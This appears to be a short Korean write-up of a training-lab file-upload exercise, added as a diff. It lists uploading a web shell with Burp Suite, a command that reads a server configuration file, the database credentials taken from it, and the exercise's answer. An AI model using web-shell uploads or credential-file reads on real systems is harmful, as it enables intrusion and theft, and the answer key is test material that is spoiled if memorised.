@@ -1,0 +1,24 @@
+파일 업로드 5번
+
+1. 문제 풀이 순서 정리
+
+파일 경로 확인
+
+웹셀 경로
+버프 스위트를 사용하여 웹셀 업로드
+
+https://elms2.skinfosec.co.kr:8085/exam31/lib/file/faq/abcdfu.php
+
+cat /var/www/html/conf/property.php
+
+DB 정보 탈취
+	/* RealDB	*/	
+	define( "db_host" , "127.0.0.1" ); 
+	define( "db_user" , "db_con_user" );
+	define( "db_pass" , "web_shell_upload" ); 
+	define( "db_db" , "webshell_db" );
+
+
+2. 정답
+
+web_shell_upload
